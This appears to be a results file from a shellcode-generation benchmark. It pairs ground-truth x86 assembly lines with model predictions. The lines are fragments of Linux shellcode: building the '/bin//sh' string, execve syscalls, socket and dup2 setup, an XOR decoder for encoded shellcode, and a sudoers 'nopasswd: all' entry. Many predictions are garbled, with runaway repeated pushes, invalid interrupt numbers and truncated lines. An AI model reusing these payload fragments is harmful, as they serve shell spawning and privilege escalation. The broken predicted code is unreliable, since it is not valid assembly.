Ground Truth Snippets ErrorGENEXE;Predicted Snippets ErrorGENEXE
push 0x6d6f632e \\n push 0x656c676f \\n push 0x6f672031 \\n push 0x2e312e31 \\n push 0x2e373231;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f
xor eax, eax \\n xor ebx, ebx;xor eax, eax \\n mul eax
sub bl, al;sub al, bl
int 0x80;mov al, 0x68732f2f \\n int 0x6e69622f
pop esi;mov esi, esp
section .bss;section .
mov eax, [y];mov eax, y
get:;get_label:
zerod:;_zerod:
mov al, [byte_tbl+2];mov al, byte_tbl+2
mov ebx, [y];mov ebx, y
duploop:;duploop_label:
inc esi \\n inc esi;inc esi \\n inc esi \\n inc esi \\n inc esi
int 80h;int 0x80
push edx;push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x
next_addr:;_next_addr:
inc ax;add ax, 1
push 0x65782e2f \\n push 0x706d742f;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f
sub eax, eax;xor eax, eax
push word 0x0a;push af_inet6
db 'all all=(all) nopasswd: all', 0xa;db 'all all=(all) nopasswd: all'
mov[esi+39], ebx;pop ebx
zero1a:;_zero1a:
cmp edx, 0x43 \\n ja loop \\n push edx;cmp edx, 0x43 \\n jge loop \\n push edx
section .text;section
push word 0x3582;push word 0x68732f2f \\n push word 0x6e69622f \\n push word 0x69622f \\n push word 0x69622f
mov bl, 0x01;mov bl, sys_socket
xor byte [esi+1], dl;xor [esi], dl
cmp cl, dl \\n je encodedshellcode;cmp cl, dl \\n je _encodedshellcode
lea ecx, [esp];mov ecx, esp
xor eax,eax \\n xor ebx,ebx;xor eax, eax \\n mul eax
sub eax, [esp];sub eax, esp
cmp cl, 0xff \\n jne dup2;cmp cl, 0xff, \\n jne _dup2
call [esp];int 0x80
mov edx, eax;xchg edx, eax
call write;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f
xchg ebx, eax;xchg eax, ebx
mov ecx, esp;mov ecx, [args]
lea ecx, [esp];mov ebx, esp
mov cl, len;mov cl, 0x68732f2f \\n add cl, 0x68732f \\n add cl, 0x6e69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x6e69622f \\n add cl, 0x6e69622f \\n add cl, 0x69622f2f \\n add cl, 0x6
mov al, 11 \\n int 0x80;int 0x80
jmp edi;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f
jae _start-0x24;jns _start-0x24
push 0x2;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f
mov [1000h], ax;mov ax, 1000h
mov ebx, type var3;mov ebx, var3
open:;open_label:
switch:;_switch:
mov byte al, 0xa4;mov al, byte [0xa4]
push 0xb \\n pop eax;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n mov eax, esp
mov al, 0xb \\n int 0x80;mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f
cmp BYTE al, 2 \\n je do_inject \\n jmp while;cmp al, 2 \\n jne while \\n jmp do_inject
